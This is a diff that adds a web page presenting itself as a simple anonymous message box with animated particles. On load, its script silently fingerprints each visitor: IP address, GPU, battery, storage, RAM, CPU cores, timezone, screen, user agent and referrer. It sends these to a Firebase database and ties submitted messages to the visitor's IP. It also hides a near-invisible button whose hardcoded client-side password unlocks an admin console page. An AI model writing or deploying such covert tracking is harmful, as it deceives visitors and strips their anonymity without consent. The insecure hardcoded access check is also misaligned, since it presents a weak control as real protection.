@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>void</title>
+    <style>
+        /* --- VISUALS --- */
+        html, body {
+            margin: 0; padding: 0; 
+            background-color: #050505; 
+            font-family: 'Courier New', monospace;
+            color: #00ff41;
+            height: 100vh;
+            overflow: hidden; /* Prevent scrolling for canvas */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        /* Canvas behind everything */
+        canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: -1;
+        }
+
+        .container {
+            width: 90%;
+            max-width: 500px;
+            border: 1px solid #333;
+            padding: 20px;
+            /* Semi-transparent black to see particles behind */
+            background: rgba(0, 0, 0, 0.85); 
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.15);
+            backdrop-filter: blur(2px);
+            z-index: 10;
+        }
+
+        h2 {
+            margin-top: 0;
+            border-bottom: 1px dashed #333;
+            padding-bottom: 10px;
+            font-size: 1.2rem;
+            text-align: center;
+            letter-spacing: 2px;
+        }
+
+        textarea {
+            width: 100%;
+            height: 150px;
+            background: #0a0a0a;
+            border: 1px solid #333;
+            color: #ddd;
+            padding: 10px;
+            font-family: inherit;
+            resize: none;
+            box-sizing: border-box; 
+            outline: none;
+        }
+
+        textarea:focus { border-color: #00ff41; }
+
+        button#transmit-btn {
+            width: 100%;
+            margin-top: 15px;
+            padding: 15px;
+            background: #00ff41;
+            color: #000;
+            border: none;
+            font-weight: bold;
+            font-family: inherit;
+            cursor: pointer;
+            text-transform: uppercase;
+            transition: background 0.2s;
+        }
+
+        button#transmit-btn:hover { background: #fff; }
+        button#transmit-btn:active { background: #00cc33; }
+        
+        #status {
+            text-align: center; margin-top: 10px; color: #f60; font-size: 0.9em; height: 20px;
+        }
+
+        /* --- SECRET BUTTON --- */
+        #access-point {
+            position: fixed; bottom: 0; right: 0; 
+            background: none; border: none;
+            color: rgba(255, 255, 255, 0.01); 
+            font-size: 24px; padding: 20px;
+            cursor: default;
+            z-index: 999;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>Hello There</h2>
+        <textarea id="msg-input" placeholder="type..."></textarea>
+        <button id="transmit-btn">MESSAGE</button>
+        <div id="status"></div>
+    </div>
+
+    <button id="access-point">.</button>
+
+    <!-- LIBRARIES -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/p5.js/1.4.0/p5.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
+    <!-- === PARTICLE SYSTEM === -->
+    <script>
+        let particles = [];
+
+        function setup() {
+            createCanvas(windowWidth, windowHeight);
+            // Create particles
+            for (let i = 0; i < 120; i++) {
+                particles.push(new Particle());
+            }
+        }
+
+        function draw() {
+            background(5, 20); // Slight trail effect
+            for (let p of particles) {
+                p.behaviors();
+                p.update();
+                p.show();
+            }
+        }
+
+        function windowResized() {
+            resizeCanvas(windowWidth, windowHeight);
+        }
+
+        class Particle {
+            constructor() {
+                this.pos = createVector(random(width), random(height));
+                this.vel = p5.Vector.random2D().mult(random(0.5, 1.5));
+                this.acc = createVector(0, 0);
+                this.size = random(2, 4);
+                this.baseColor = color(0, 255, 65, 150); 
+            }
+
+            behaviors() {
+                // Interactive Repulsion from Mouse
+                let mouse = createVector(mouseX, mouseY);
+                let d = dist(this.pos.x, this.pos.y, mouse.x, mouse.y);
+                if (d < 100) {
+                    let force = p5.Vector.sub(this.pos, mouse);
+                    force.setMag(2); // Strength of push
+                    this.acc.add(force);
+                }
+            }
+
+            update() {
+                this.vel.add(this.acc);
+                this.pos.add(this.vel);
+                this.acc.mult(0); // Reset acceleration
+                this.vel.limit(4); // Limit speed
+
+                // Bounce off edges
+                if (this.pos.x > width || this.pos.x < 0) this.vel.x *= -1;
+                if (this.pos.y > height || this.pos.y < 0) this.vel.y *= -1;
+            }
+
+            show() {
+                noStroke();
+                fill(this.baseColor);
+                ellipse(this.pos.x, this.pos.y, this.size);
+            }
+        }
+    </script>
+
+    <!-- === DATA LOGIC === -->
+    <script>
+    document.addEventListener('DOMContentLoaded', async () => {
+        const firebaseConfig = {
+          apiKey: "AIzaSyD19FsJIWCif0h-ExcGODrok4M7wk_bSBc",
+          authDomain: "void-81e60.firebaseapp.com",
+          databaseURL: "https://void-81e60-default-rtdb.asia-southeast1.firebasedatabase.app",
+          projectId: "void-81e60",
+          storageBucket: "void-81e60.appspot.com",
+          messagingSenderId: "749357378719",
+          appId: "1:749357378719:web:6343550759a405e5c1c6aa"
+        };
+        const SECRET_KEY = "alpha-zero-nine"; 
+
+        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        let clientIP = "Unknown";
+
+        // --- 1. EXTENDED DATA GATHERING ---
+        const getDetailedTech = async () => {
+            // Storage Estimate (Quota)
+            let storageInfo = 'N/A';
+            if (navigator.storage && navigator.storage.estimate) {
+                try {
+                    const est = await navigator.storage.estimate();
+                    const quotaGB = (est.quota / 1024 / 1024 / 1024).toFixed(2);
+                    storageInfo = `${quotaGB} GB (Available)`;
+                } catch(e) {}
+            }
+
+            // GPU Renderer
+            let gpu = 'N/A';
+            try {
+                const gl = document.createElement('canvas').getContext('webgl');
+                const debug = gl.getExtension('WEBGL_debug_renderer_info');
+                gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : 'N/A';
+            } catch(e){}
+
+            // Battery
+            let battery = 'N/A';
+            if(navigator.getBattery) {
+                const b = await navigator.getBattery();
+                battery = `${Math.round(b.level*100)}% (${b.charging?'Charging':'Discharging'})`;
+            }
+
+            return { storageInfo, gpu, battery };
+        };
+
+        // --- 2. AUTO-LOGGER ---
+        const logVisit = async () => {
+            try {
+                // Fetch IP
+                const ipRes = await fetch('https://api.ipify.org?format=json').catch(()=>null);
+                const ipData = ipRes ? await ipRes.json() : { ip: 'N/A' };
+                clientIP = ipData.ip;
+
+                const tech = await getDetailedTech();
+
+                // High-Res Screen Data
+                const screenData = `${window.screen.width}x${window.screen.height} (PxRatio: ${window.devicePixelRatio})`;
+                const viewportData = `${window.innerWidth}x${window.innerHeight}`;
+
+                const visitData = {
+                    type: "VISIT",
+                    ip: clientIP,
+                    timestamp: new Date().toISOString(),
+                    
+                    // --- THE UPDATED "ALL-SEEING" DATA ---
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A',
+                    storage: tech.storageInfo,
+                    cpuCores: navigator.hardwareConcurrency || 'N/A',
+                    
+                    gpu: tech.gpu,
+                    battery: tech.battery,
+                    
+                    screen: screenData,
+                    viewport: viewportData,
+                    touchPoints: navigator.maxTouchPoints || 0,
+                    
+                    platform: navigator.platform,
+                    userAgent: navigator.userAgent,
+                    connection: navigator.connection ? navigator.connection.effectiveType : 'N/A',
+                    referrer: document.referrer || 'Direct'
+                };
+
+                db.ref('records').push(visitData);
+                db.ref('engagements').transaction(v => (v||0)+1);
+                console.log("Uplink Established.");
+
+            } catch (e) { console.log("Silent Error."); }
+        };
+
+        logVisit();
+
+
+        // --- 3. MESSAGE TRANSMITTER ---
+        const sendMessage = async () => {
+            const msgInput = document.getElementById('msg-input');
+            const status = document.getElementById('status');
+            const message = msgInput.value.trim();
+
+            if(!message) {
+                status.innerText = "NO DATA DETECTED.";
+                return;
+            }
+
+            status.innerText = "SENDING...";
+            status.style.color = "#f60";
+
+            try {
+                const messagePayload = {
+                    type: "MESSAGE", 
+                    ip: clientIP,    
+                    timestamp: new Date().toISOString(),
+                    text: message    
+                };
+
+                await db.ref('records').push(messagePayload);
+
+                status.innerText = "TRANSMISSION COMPLETE.";
+                status.style.color = "#00ff41";
+                msgInput.value = ""; 
+
+            } catch (e) {
+                status.innerText = "FAILURE.";
+                status.style.color = "red";
+            }
+        };
+
+        document.getElementById('transmit-btn').addEventListener('click', sendMessage);
+
+        // Secret Door
+        document.getElementById('access-point').addEventListener('click', () => {
+            if(prompt("ACCESS CODE:") === SECRET_KEY) window.location.href = 'console.html';
+            else alert("DENIED");
+        });
+    });
+    </script>
+</body>
+</html>
